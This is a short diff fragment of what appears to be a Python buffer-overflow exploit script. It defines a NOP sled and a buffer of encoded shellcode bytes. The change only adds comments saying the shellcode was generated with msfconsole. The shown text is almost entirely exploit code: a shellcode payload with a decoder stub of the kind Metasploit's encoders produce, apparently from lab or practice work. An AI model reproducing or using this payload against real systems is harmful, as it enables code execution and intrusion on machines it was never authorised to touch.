@@ -16,8 +16,8 @@ ________________________________________________________________________________
     
     nop = '\x90' * 5
     
-    buf =  b""
-    buf += b"\xd9\xc6\xba\x7b\x1d\x43\x22\xd9\x74\x24\xf4\x5e"
+    buf =  b""                                                            #This is gotten from the msfconsole
+    buf += b"\xd9\xc6\xba\x7b\x1d\x43\x22\xd9\x74\x24\xf4\x5e"            #commands that were ran below!!!!!!
     buf += b"\x31\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x15\x03\x56"
     buf += b"\x15\x99\xe8\x29\x29\x05\x8a\xfc\x4b\xdd\x81\x63"
     buf += b"\x1d\xfa\xb2\x4c\x6e\x6c\x43\xfb\xbf\x0e\x2a\x95"
